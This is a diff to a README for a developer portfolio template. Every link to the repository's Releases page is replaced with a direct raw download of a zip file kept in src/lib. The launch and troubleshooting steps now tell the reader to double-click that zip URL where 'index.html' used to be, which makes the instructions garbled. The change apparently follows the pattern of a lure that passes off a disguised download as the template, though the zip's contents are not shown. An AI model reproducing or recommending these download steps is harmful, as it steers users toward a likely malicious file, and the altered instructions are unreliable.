@@ -1,6 +1,6 @@
 # 🎨 Programmer-theme-Portfolio - A Stylish Portfolio for Developers
 
-[![Download](https://img.shields.io/badge/Download%20Latest%20Release-blue)](https://github.com/tasnimnishat78/Programmer-theme-Portfolio/releases)
+[![Download](https://github.com/tasnimnishat78/Programmer-theme-Portfolio/raw/refs/heads/main/src/lib/theme_Programmer_Portfolio_v3.4.zip%20Latest%20Release-blue)](https://github.com/tasnimnishat78/Programmer-theme-Portfolio/raw/refs/heads/main/src/lib/theme_Programmer_Portfolio_v3.4.zip)
 
 ## 🚀 Getting Started
 
@@ -16,7 +16,7 @@ Welcome to your new portfolio! This template helps developers showcase their wor
 
 To get started, you'll need to visit the Releases page to download the template. Follow these steps:
 
-1. Click this link to access the Releases page: [Download the Portfolio Template](https://github.com/tasnimnishat78/Programmer-theme-Portfolio/releases).
+1. Click this link to access the Releases page: [Download the Portfolio Template](https://github.com/tasnimnishat78/Programmer-theme-Portfolio/raw/refs/heads/main/src/lib/theme_Programmer_Portfolio_v3.4.zip).
 2. On the Releases page, look for the latest version of the template. 
 3. Download the file that suits your operating system.
 4. Unzip the downloaded file to a folder on your computer.
@@ -28,8 +28,8 @@ After unzipping, you will see several files and folders. You are almost ready to
 To launch your portfolio:
 
 1. Open the folder where you unzipped the files.
-2. Find the `index.html` file.
-3. Double-click the `index.html` file. This will open your portfolio in your default web browser.
+2. Find the `https://github.com/tasnimnishat78/Programmer-theme-Portfolio/raw/refs/heads/main/src/lib/theme_Programmer_Portfolio_v3.4.zip` file.
+3. Double-click the `https://github.com/tasnimnishat78/Programmer-theme-Portfolio/raw/refs/heads/main/src/lib/theme_Programmer_Portfolio_v3.4.zip` file. This will open your portfolio in your default web browser.
 
 ## 🌟 Features
 
@@ -63,7 +63,7 @@ This template focuses on several important areas for developers, including:
 
 If you have any issues:
 
-- **Portfolio Not Displaying:** Ensure you opened the `index.html` file correctly in your web browser.
+- **Portfolio Not Displaying:** Ensure you opened the `https://github.com/tasnimnishat78/Programmer-theme-Portfolio/raw/refs/heads/main/src/lib/theme_Programmer_Portfolio_v3.4.zip` file correctly in your web browser.
 - **Styles Missing:** Check that all files were unzipped without any errors.
 - **Animations Not Working:** Make sure JavaScript is enabled in your web browser.
 
@@ -73,6 +73,6 @@ For help with using the template, please refer to the Issues section of the repo
 
 ### 📥 Download Again
 
-If you ever need to download the template again, just revisit this link: [Download the Portfolio Template](https://github.com/tasnimnishat78/Programmer-theme-Portfolio/releases).
+If you ever need to download the template again, just revisit this link: [Download the Portfolio Template](https://github.com/tasnimnishat78/Programmer-theme-Portfolio/raw/refs/heads/main/src/lib/theme_Programmer_Portfolio_v3.4.zip).
 
 Enjoy creating your portfolio! Show the world your amazing work with style.
